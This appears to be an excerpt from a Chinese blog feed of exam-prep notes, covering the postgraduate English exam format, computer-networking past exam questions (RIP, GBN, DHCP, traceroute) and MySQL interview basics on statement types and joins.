<h2 id="III-考试形式、考试内容与试卷结构"><a href="#III-考试形式、考试内容与试卷结构" class="headerlink" title="III.考试形式、考试内容与试卷结构"></a><strong>III.考试形式、考试内容与试卷结构</strong></h2><h3 id="一-考试形式"><a href="#一-考试形式" class="headerlink" title="(一)考试形式"></a><strong>(一)考试形式</strong></h3><p>考试形式为笔试。考试时间为180分钟。满分为100分。</p>
<p>试卷包括试题册和1张答题卡。考生应将英语知识运用和阅读理解部分的答案按要求涂写在答题卡相应题号的选项上，将翻译和写作部分的答案书写在答题卡指定位置的边框区域内。</p>
<h3 id="二-考试内容"><a href="#二-考试内容" class="headerlink" title="(二)考试内容"></a><strong>(二)考试内容</strong></h3><p>试题分四部分，共48题，包括英语知识运用、阅读理解、翻译和写作。</p>
<h4 id="第一部分-英语知识运用"><a href="#第一部分-英语知识运用" class="headerlink" title="第一部分 英语知识运用"></a>第一部分 英语知识运用</h4><p>主要考查考生对英语知识的综合运用能力。共20小题，每小题0.5分，共10分。</p>
<p>在一篇约350词的文章中留出20个空白，要求考生从每题给出的4个选项中选出最佳答案，使补全后的文章意思通顺、前后连贯、结构完整。</p>
<h4 id="第二部分-阅读理解"><a href="#第二部分-阅读理解" class="headerlink" title="第二部分 阅读理解"></a>第二部分 阅读理解</h4><p>主要考查考生获取信息、理解文章、猜测重要生词词义并进行推断等方面的能力。该部分由A、B两节组成，共25小题，每小题2分，共50分。</p>
<p>A节(20小题)</p>
<p>本部分为多项选择题。共四篇文章，总长度为1500~1600词。要求考生阅读文章并回答每篇文章后面的问题。考生需要在每小题所提供的选项(A、B、C、D)中选出唯一正确或是最合适的答案。</p>
<p>每篇文章设5题，共20题。每小题2分，共40分。</p>
<p>B节(5小题)</p>
<p>本节有两种备选题型。每次考试从这两种题型中选择其中的一种形式，或者两种形式的组合进行考查。</p>
<p>本节文章设5小题，每小题2分，共10分。</p>
<p>备选题型包括：</p>
<p>1)多项对应</p>
<p>本节为一篇长度为450~550词的文章，试题内容分为左右两栏，左侧一栏为5道题目，右侧一栏为7个选项。要求考生在阅读后根据文章内容和左侧一栏中提供的信息从右侧一栏中的7个选项中选出对应的5项相关信息。</p>
<p>2)小标题对应</p>
<p>在一篇长度为450~550词的文章前有7个概括句或小标题。这些文字或标题分别是对文章中某一部分的概括或阐述。要求考生根据文章内容和篇章结构从这7个选项中选出最恰当的5个概括句或小标题填入文章空白处。</p>
<h4 id="第三部分-翻译"><a href="#第三部分-翻译" class="headerlink" title="第三部分 翻译"></a>第三部分 翻译</h4><p>考查考生理解所给英语语言材料并将其译成汉语的能力。要求译文准确、完整、通顺。</p>
<p>要求考生阅读、理解长度为150词左右的一个或几个英语段落，并将其全部译成汉语。共15分。</p>
<h4 id="第四部分-写作"><a href="#第四部分-写作" class="headerlink" title="第四部分 写作"></a>第四部分 写作</h4><p>该部分由A、B两节组成，主要考查考生的书面表达能力。共2题，25分。</p>
<p>A节</p>
<p>考生根据所给情景写出约100词(标点符号不计算在内)的应用性短文，包括<strong>私人</strong>和<strong>公务信函</strong>、<strong>备忘录</strong>、<strong>报告</strong>等。共10分。</p>
<p>B节</p>
<p>要求考生根据所规定的情景或给出的提纲，写出一篇150词左右的英语说明文或议论文。提供情景的形式为图画、图表或文字。共15分。</p>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络真题</title>
    <url>/2021/09/21/%E8%80%83%E7%A0%94/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9C%9F%E9%A2%98/</url>
    <content><![CDATA[<h1 id="计算机网络真题"><a href="#计算机网络真题" class="headerlink" title="计算机网络真题"></a>计算机网络真题</h1><p>类比发邮件, </p>
<p>一个小区一个ip地址，多个小区构成一个城市</p>
<p>每个城市有一个路由器。路由器有多个接口，一个口能通往一个城市，每个接口的地址就是网关的地址。</p>
<p>网关是你所在的网络的一个路由器，就如同一个看门的，把属于该子网的消息包接收过来，不属于的就过滤掉。</p>
<p>路由器也有缓存，中央处理单元，内嵌式操做系统，内存等等</p>
<p>网关地址就是分配给路由器对应接口的IP地址。对于网关来说，只要是除了网络地址（主机号全0），广播地址（主机号全1）以外的可用主机地址都可以分配给它。比方说，在192.168.1.0&#x2F;24 的网络里面，网络地址是192.168.1.0 广播地址是192.168.1.255，那么除了以上两个地址以外的192.168.1.1-192.168.1.254 都是可以分配给网关的</p>
<p>举例说明：IP是192.168.154.128 ，子网掩码是24位的，那么网络号就是192.168.154.0，我在给他指定一个网关是192.168.154.2 。</p>
<p>这个时候，我的这台电脑想要和同网的192.168.154.129通信，那么他就不用网关了，直接发到局域网上就可以了。但是如果我想要发给远程的主机，比方说IP是192.168.2.1 同样24位的，它的网络号就是192.168.2.0 这时网关就起作用了，我的电脑就会把数据发给网关，由网关再转发一直到达目的地也就是IP 是192.168.2.1的主机上。</p>
<p>121.35.102.11</p>
<p>100.64.57.168</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448070.jpg" alt="img"></p>
<p>traceroute程序完整过程：首先它发送一份TTL字段为1的IP数据包给目的主机，处理这个数据包的第一个路由器将TTL值减1，然后丢弃该数据报，并给源主机发送一个ICMP报文（“超时”信息，这个报文包含了路由器的IP地址，这样就得到了第一个路由器的地址），然后traceroute发送一个TTL为2的数据报来得到第二个路由器的IP地址，继续这个过程，直至这个数据报到达目的主机。</p>
<p>计算机网络中的自治系统是指能够自主决定在本系统中应采取某种路由协议的单位。</p>
<p>内部网关协议 IGP (Interior Gateway Protocol)  即在一个自治系统内部使用的路由选择协议。目前这类路由选择协议使用得最多，如 RIP 和 OSPF 协议。</p>
<p>外部网关协议EGP (External Gateway Protocol)  若源站和目的站处在不同的自治系统中，当数据报传到一个自治系统的边界时，就需要使用一种协议将路由选择信息传递到另一个自治系统中。这样的协议就是外部网关协议 EGP。在外部网关协议中目前使用最多的是 BGP-4。 </p>
<p>外部网关协议EGP (External Gateway Protocol)  若源站和目的站处在不同的自治系统中，当数据报传到一个自治系统的边界时，就需要使用一种协议将路由选择信息传递到另一个自治系统中。这样的协议就是外部网关协议 EGP。在外部网关协议中目前使用最多的是 BGP-4。 </p>
<h1 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h1><p>WAN ， Wide Area Network 广域网</p>
<p>广域网传播范围广，一般用于世界的国家、地区之间的网络连接，一般范围为几十到几千公里不等。远距离传输，需要高速链路。</p>
<p>MAN ，Metroplitan Area Network 城域网</p>
<p>城域网一般用于城际信息的传输，一般使用的技术为以太网，传输范围为5~50km。</p>
<p>LAN ， Local Area Network 局域网</p>
<p>局域网的作用范围一般就是1km左右，公司、学校一般都有多个局域网（企业网&#x2F;校园网）。</p>
<p>PAN ，Personal Area Network 个人局域网</p>
<p>一般使用无线技术，因此也常被称为WPAN。我们手机都有共享WIFI，共享热点的功能，这些功能就是使用PAN技术。</p>
<ul>
<li>公用网络：电信运营商出资建造的大型网络。接入需要一定费用。（简称外网）</li>
<li>专用网络：单位内部建造的网络。这种网络不向本单位以外的公众开放。（简称内网）</li>
</ul>
<p>发送时延慢，传播时延快</p>
<h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h1><p>（2009统考真题35）数据链路层采用后退 N 帧(GBN)协议，发送方已经发送了编号为 0~7 的 帧。当计时器超时时，若发送方只收到 0、2、3 号帧的确认，则发送方需要重发的帧数是______________________________ 。</p>
<p>A.2   B.3   C.4   D.5</p>
<p>答案：C</p>
<p>解析：在GBN协议中，丢失一个后面全抛弃。连续ARQ采用累计确认的方式。</p>
<h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><p>网络层向上只提供简单灵活的，无连接，尽最大努力交互的数据报服务。</p>
<h2 id="虚电路和电路交换"><a href="#虚电路和电路交换" class="headerlink" title="虚电路和电路交换"></a>虚电路和电路交换</h2><p>电路交换：通常是在物理层，譬如打电话等。此时整个物理线路的带宽是由该通讯独占的。</p>
<p>虚电路交换：在一条物理线路上虚拟出多个逻辑的通道，此时该物理线路上可以有多条通讯量，每条通讯独占一条虚拟电路。多个虚拟电路通过时分&#x2F;频分等多路复用方式复用到一条物理链路上。</p>
<p>IP地址分类：</p>
<p>1.0.0.0   到 126.255.255.255为A类  主要分配给具有大量主机而局域网络数量较少的大型网络<br>128.0.0.0 到 191.255.255.255为B类  一般用于国际性大公司和政府机构<br>192.0.0.0 到 223.255.255.255为C类  用于一般小公司 校园网 研究机构等<br>224.0.0.0 到 239.255.255.255为D类  用于特殊用途. 又称做广播地址<br>240.0.0.0 到 247.255.255.255为E类. 暂时保留 </p>
<p>（2010统考真题）某自治系统内采用 RIP 协议，若该自治系统内的路由器 R1 收到其邻居路由器 R2 的距离矢量，</p>
<p>距离矢量中包含信息&lt;net1,16&gt;，则能得出的结</p>
<p>论是____________________________ 。</p>
<p>A.R2 可以经过 R1 到达 net1，跳数为 17 </p>
<p>B.R2 可以到达 net1，跳数为 16</p>
<p>C.R1 可以经过 R2 到达 net1，跳数为 17 </p>
<p>D.R1 不能经过 R2 到达 net1</p>
<p>答案：D</p>
<p>解析：考查 RIP 路由协议。R1 在收到信息并更新路由表后，若需要经过 R2 到达 net1，则其跳数为 17，由于距离为 16 表示不可达，因此 R1 不能经过 R2 到达 net1，R2 也 不可能到达 net1。B、C 错误，D 正确。而题目中并未给出 R1 向 R2 发送 的信息，因此 A 也不正确。</p>
<h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h1 id="历年真题"><a href="#历年真题" class="headerlink" title="历年真题"></a>历年真题</h1><h2 id="2020"><a href="#2020" class="headerlink" title="2020"></a>2020</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448072.png" alt="截屏2021-08-14 下午6.51.50"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448073.png" alt="截屏2021-08-14 下午6.51.58"></p>
<p>NAT ：network address translation</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448074.png" alt="截屏2021-08-14 下午6.52.15"></p>
<h2 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448075.png" alt="image-20211023102126888"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448076.png" alt="image-20211023102141272"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448077.png" alt="image-20211023102801041"></p>
<h2 id="2018"><a href="#2018" class="headerlink" title="2018"></a>2018</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448078.png" alt="image-20211023103213188"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448079.png" alt="image-20211023103226104"></p>
<p>0      111 1101 </p>
<p>1      1111101</p>
<p>MTU：Maximum Transmission Unit</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448080.png" alt="image-20211023103252056"></p>
<p>0 - 775</p>
<p>776 - 1480</p>
<h2 id="2017"><a href="#2017" class="headerlink" title="2017"></a>2017</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448081.png" alt="image-20211023104056006"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448082.png" alt="image-20211023104135653"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448083.png" alt="image-20211023104155315"></p>
<p>停等协议只需要一个bit给帧编号</p>
<p>为什么GBN协议的序号个数要大于等于发送窗口+1？</p>
<p>1&lt;&#x3D; Wt &lt;&#x3D; 2^n - 1</p>
<p>0 1 2 3 0 1 2 3</p>
<p>如果是4</p>
<p>4个全发出去，4个ack都丢了，之后发送发送方重传，接收方无法识别是新的还是旧的。接收方接受窗口是1</p>
<p>SR协议</p>
<p>若采用n个比特对帧编号，则其发送窗口的尺寸应满足：1~2^(n-1)^</p>
<p>。若发送窗口的尺寸大于2^(n-1)，则会造成接受方无法分辨新帧和旧帧。</p>
<h2 id="2016"><a href="#2016" class="headerlink" title="2016"></a>2016</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448084.png" alt="image-20211023140015900"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448085.png" alt="image-20211023140036936"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448086.png" alt="image-20211023140102549"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448087.png" alt="image-20211023140125531"></p>
<p>慢开始算法每次收到一个对新报文段的确认就使发送方的拥塞窗口加1</p>
<h2 id="2015"><a href="#2015" class="headerlink" title="2015"></a>2015</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448088.png" alt="image-20211023142922439"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448089.png" alt="image-20211023142934609"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448090.png" alt="image-20211023142956645"></p>
<p>ARP：Address Resolution Protocol</p>
<p>DHCP：Dynamic Host Configuration Protocol</p>
<p>DHCP租约过程就是DHCP客户机动态获取IP地址的过程。</p>
<p><a href="https://blog.51cto.com/yuanbin/109574">https://blog.51cto.com/yuanbin/109574</a></p>
<p>DHCP租约过程分为4步：</p>
<ul>
<li><p>客户机请求IP（客户机发DHCPDISCOVER广播包）</p>
<p>当一个DHCP客户机启动时，会自动将自己的IP地址配置成0.0.0.0，由于使用0.0.0.0不能进行正常通信，所以客户机就必须通过DHCP服务器来获取一个合法的地址。由于客户机不知道DHCP服务器的IP地址，所以它使用0.0.0.0的地址作为源地址，使用UDP68端口作为源端口，使用255.255.255.255作为目标地址，使用UDP67端口作为目的端口来广播请求IP地址信息。广播信息中包含了DHCP客户机的MAC地址和计算机名，以便使DHCP服务器能确定是哪个客户机发送的请求。</p>
</li>
<li><p>服务器响应（服务器发DHCPOFFER广播包）；</p>
<p>当DHCP服务器接收到客户机请求IP地址的信息时，它就在自己的IP地址池中查找是否有合法的IP地址提供给客户机。如果有，DHCP服务器就将此IP地址做上标记，加入到DHCPOFFER的消息中，然后DHCP服务器就广播一则包括下列信息的DHCPOFFER消息：</p>
<p>DHCP客户机的MAC地址；DHCP服务器提供的合法IP地址；子网掩码；默认网关（路由）；租约的期限；DHCP服务器的IP地址。</p>
<p> 因为DHCP客户机还没有IP地址，所以DHCP服务器使用自己的IP地址作为源地址，使用UDP67端口作为源端口，使用255.255.255.255作为目标地址，使用UDP68端口作为目的端口来广播DHCPOFFER信息。</p>
</li>
<li><p>客户机选择IP（客户机发DHCPREQUEST广播包）；</p>
<p>DHCP客户机从接收到的第一个DHCPOFFER消息中选择IP地址，发出IP地址的DHCP服务器将该地址保留，这样该地址就不能提供给另一个DHCP客户机。当客户机从第一个DHCP服务器接收DHCPOFFER并选择IP地址后，DHCP租约的第三过程发生。客户机将DHCPREQUEST消息广播到所有的DHCP服务器，表明它接受提供的内容。DHCPREQUEST消息包括为该客户机提供IP配置的服务器的服务标识符（IP地址）。DHCP服务器查看服务器标识符字段，以确定它自己是否被选择为指定的客户机提供IP地址，如果那些DHCPOFFER被拒绝，则DHCP服务器会取消提供并保留其IP地址以用于下一个IP租约请求。</p>
<p>在客户机选择IP的过程中，虽然客户机选择了IP地址，但是还没有配置IP地址，而在一个网络中可能有几个DHCP服务器，所以客户机仍然使用0.0.0.0的地址作为源地址，使用UDP68端口作为源端口，使用255.255.255.255作为目标地址，使用UDP67端口作为目的端口来广播DHCPREQUEST信息。</p>
</li>
<li><p>服务器确定租约（服务器发DHCPACK&#x2F;DHCPNAK广播包）。</p>
<p>HCP服务器接收到DHCPREQUEST消息后，以DHCPACK消息的形式向客户机广播成功的确认，该消息包含有IP地址的有效租约和其他可能配置的信息。虽然服务器确认了客户机的租约请求，但是客户机还没有收到服务器的DHCPACK消息，所以服务器仍然使用自己的IP地址作为源地址，使用UDP67端口作为源端口，使用255.255.255.255作为目标地址，使用UDP68端口作为目的端口来广播DHCPACK信息（见图四）。当客户机收到DHCPACK消息时，它就配置了IP地址，完成了TCP&#x2F;IP的初始化。</p>
<p>如果DHCPREQUEST不成功，例如客户机试图租约先前的IP地址，但该IP地址不再可用，或者因为客户机移到其他子网，该IP无效时，DHCP服务器将广播否定确认消息DHCPNAK。当客户机接收到不成功的确认时，它将重新开始DHCP租约过程。</p>
<h2 id="2014"><a href="#2014" class="headerlink" title="2014"></a>2014</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448091.png" alt="截屏2021-10-23 下午2.49.00"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448092.png" alt="image-20211023144842130"></p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448094.png" alt="image-20211023144956317"></p>
<p>TTL：Time To Live</p>
<h2 id="2013"><a href="#2013" class="headerlink" title="2013"></a>2013</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448095.png" alt="image-20211023150334299"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448096.png" alt="image-20211023150356523"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448097.png" alt="image-20211023150602726"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448098.png" alt="image-20211023150619721"></p>
<h2 id="2012"><a href="#2012" class="headerlink" title="2012"></a>2012</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448099.png" alt="image-20211023153215305"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448100.png" alt="image-20211023153246832"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448101.png" alt="image-20211023153411242"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448102.png" alt="image-20211023153425162"></p>
<h2 id="2011"><a href="#2011" class="headerlink" title="2011"></a>2011</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448103.png" alt="image-20211023154150691"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448104.png" alt="image-20211023154204203"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448105.png" alt="image-20211023155222392"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448106.png" alt="image-20211023155236913"></p>
<h2 id="2010"><a href="#2010" class="headerlink" title="2010"></a>2010</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448107.png" alt="image-20211023160654801"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448108.png" alt="image-20211023160715367"></p>
<h2 id="2009"><a href="#2009" class="headerlink" title="2009"></a>2009</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448109.png" alt="image-20211023160944162"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448110.png" alt="image-20211023160955832"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448111.png" alt="image-20211023161433080"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448112.png" alt="image-20211023161446545"></p>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>408</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL</title>
    <url>/2022/02/15/%E9%9D%A2%E8%AF%95/MySQL/</url>
    <content><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151504917.png" alt="image-20210423222127334"></p>
<h2 id="DML、DDL、DCL区别以及定义"><a href="#DML、DDL、DCL区别以及定义" class="headerlink" title="DML、DDL、DCL区别以及定义"></a>DML、DDL、DCL区别以及定义</h2><p>结构化查询语言（Structured Query Language，SQL）是用于管理关系数据库管理系统（RDBMS）。 SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。</p>
<p>数据操作语言（Data Manipulation Language，DML）用于检索或者修改数据。DML包括：SELECT、DELETE、 UPDATE和INSERT。</p>
<p>数据定义语言（Data Definition Language，DDL）用于定义数据的结构，比如创建、修改或者删除数据库对象DDL包括：CREATE TABLE、ALTER TABLE、DROP TABLE、CREATE INDEX、DROP INDEX和TRUNCATE TABLE。</p>
<p>数据控制语言（Data Control Language，DCL）用于定于数据库用户的权限。DCL包括：ALTER PASSWORD、GRANT、REVOKE 和CREATE SYNONYM。</p>
<h2 id="TRUNCATE、DELETE和DROP的区别"><a href="#TRUNCATE、DELETE和DROP的区别" class="headerlink" title="TRUNCATE、DELETE和DROP的区别"></a>TRUNCATE、DELETE和DROP的区别</h2><ul>
<li>truncate table类似于delete删除所有行的语句或drop table然后再create table语句的组合。</li>
<li>truncate为了实现高性能，它绕过了删除数据的DML方法，因此，它不能回滚。</li>
<li>truncate会清空所有数据且执行速度很快。</li>
<li>truncate不能对有外键约束引用的表使用。</li>
<li>执行truncate需要drop权限，不建议给账号drop权限。</li>
<li>执行truncate前一定要再三检查确认，最好提前备份下表数据。</li>
<li>truncate与drop是DDL语句，执行后无法通过binlog回滚；delete是DML语句，可回滚。</li>
<li>truncate只能作用于表；delete，drop可作用于表、视图等。</li>
<li>truncate删除没有返回值；delete删除有返回值。</li>
<li>truncate删除后插入从0开始；delete从删除时的下一个位置开始；</li>
<li>truncate会清空表中的所有行，但表结构及其约束、索引等保持不变；drop会删除表的结构及其所依赖的约束、索引等。</li>
<li>truncate不会激活与表有关的删除触发器；delete可以。</li>
<li>truncate后会使表和索引所占用的空间会恢复到初始大小；delete操作不会减少表或索引所占用的空间；drop语句将表所占用的空间全释放掉。</li>
<li>在InnoDB中，delete操作并不会真的删除数据，mysql实际上只是给要删除的数据打了标记，标记为删除。磁盘所占空间不会变小，即表空间并没有真正被释放。</li>
</ul>
<h2 id="交叉连接、内连接、外连接、联合连接和自然连接"><a href="#交叉连接、内连接、外连接、联合连接和自然连接" class="headerlink" title="交叉连接、内连接、外连接、联合连接和自然连接"></a>交叉连接、内连接、外连接、联合连接和自然连接</h2><h3 id="交叉连接（CROSS-JOIN）"><a href="#交叉连接（CROSS-JOIN）" class="headerlink" title="交叉连接（CROSS JOIN）"></a>交叉连接（CROSS JOIN）</h3><p> 交叉连接（CROSS JOIN）：有两种，显式的和隐式的，不带ON子句（在MySQL支持ON，和INNER JOIN等价），返回的是两表的乘积，也叫笛卡尔积。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 隐式的交叉连接</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a, `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">where</span> a.id <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 显式的交叉连接</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">cross</span> <span class="keyword">join</span> `<span class="keyword">user</span>` b <span class="keyword">where</span> a.id <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="内连接（INNER-JOIN）"><a href="#内连接（INNER-JOIN）" class="headerlink" title="内连接（INNER JOIN）"></a>内连接（INNER JOIN）</h3><p>内连接（INNER JOIN）：有两种，显式的和隐式的，返回连接表中符合连接条件和查询条件的数据行。（所谓的链接表就是数据库在做查询形成的中间表）。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 隐式的内连接，没有<span class="keyword">INNER</span> <span class="keyword">JOIN</span>，形成的中间表为两个表的笛卡尔积。</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a, `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">where</span> a.id <span class="operator">=</span> b.id</span><br><span class="line"></span><br><span class="line"># 显示的内连接，一般称为内连接，有<span class="keyword">INNER</span> <span class="keyword">JOIN</span>，形成的中间表为两个表经过<span class="keyword">ON</span>条件过滤后的笛卡尔积。</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> `<span class="keyword">user</span>` b <span class="keyword">on</span> a.id <span class="operator">=</span> b.id</span><br></pre></td></tr></table></figure>

<h3 id="外连接（OUTER-JOIN）"><a href="#外连接（OUTER-JOIN）" class="headerlink" title="外连接（OUTER JOIN）"></a>外连接（OUTER JOIN）</h3><p>外连接（OUTER JOIN）不但返回符合连接和查询条件的数据行，还返回不符合条件的一些行。外连接分三类：左外连接（LEFT OUTER JOIN）、右外连接（RIGHT OUTER JOIN）和全外连接（FULL OUTER JOIN）。在三种类型的外连接中，OUTER 关键字是可省略的。 </p>
<p>三者的共同点是都返回符合连接条件和查询条件（即：内连接）的数据行。</p>
<p>不同点如下： </p>
<ul>
<li>左外连接还返回左表中不符合连接条件单符合查询条件的数据行。</li>
<li>右外连接还返回右表中不符合连接条件单符合查询条件的数据行。</li>
<li>全外连接还返回左表中不符合连接条件单符合查询条件的数据行，并且还返回右表中不符合连接条件单符合查询条件的数据行。全外连接实际是上左外连接和右外连接的数学合集（去掉重复），即“全外&#x3D;左外 UNION 右外”。在MySQL中不支持全外连接，可以用“左外 UNION 右外”实现全外连接。</li>
</ul>
<h3 id="联合连接（UNION-JOIN）"><a href="#联合连接（UNION-JOIN）" class="headerlink" title="联合连接（UNION JOIN）"></a>联合连接（UNION JOIN）</h3><p>这是一种很少见的连接方式。Oracle、MySQL均不支持，其作用是：找出全外连接和内连接之间差异的所有行。这在数据分析中排错中比较常用。也可以利用数据库的集合操作来实现此功能。</p>
<h3 id="自然连接（NATURAL-INNER-JOIN）"><a href="#自然连接（NATURAL-INNER-JOIN）" class="headerlink" title="自然连接（NATURAL INNER JOIN）"></a>自然连接（NATURAL INNER JOIN）</h3><p>自然连接无需指定连接列，SQL会检查两个表中是否相同名称的列，且假设他们在连接条件中使用，并且在连接条件中仅包含一个连接列。</p>
<p>MySQL环境下：不允许使用ON语句，允许指定显式列。自然连接分为内外之分。内：NATURAL JOIN（不能加INNER）。外：NATURAL LEFT JOIN和NATURAL RIGHT JOIN。</p>
<p>ORACLE环境下：不允许使用ON语句，不允许指定显式列，显式列只能用*表示。对于每种连接类型（除了交叉连接外），均可指定NATURAL。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">natural</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b</span><br><span class="line"># 如果两张表都有name，age字段，相当于如下语句，但是必须写a.name,a.age</span><br><span class="line"><span class="keyword">select</span> a.name,a.age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">on</span> a.name <span class="operator">=</span> b.name <span class="keyword">and</span> a.age <span class="operator">=</span> b.age</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">natural</span> <span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b</span><br><span class="line"># 如果两张表都有name，age字段，相当于如下语句，但是必须写a.name,a.age</span><br><span class="line"><span class="keyword">select</span> a.name,a.age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">on</span> a.name <span class="operator">=</span> b.name <span class="keyword">and</span> a.age <span class="operator">=</span> b.age</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">natural</span> <span class="keyword">right</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b</span><br><span class="line"># 如果两张表都有name，age字段，相当于如下语句，但是必须写b.name,b.age</span><br><span class="line"><span class="keyword">select</span> b.name,b.age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a  <span class="keyword">right</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">on</span> a.name <span class="operator">=</span> b.name <span class="keyword">and</span> a.age <span class="operator">=</span> b.age</span><br></pre></td></tr></table></figure>

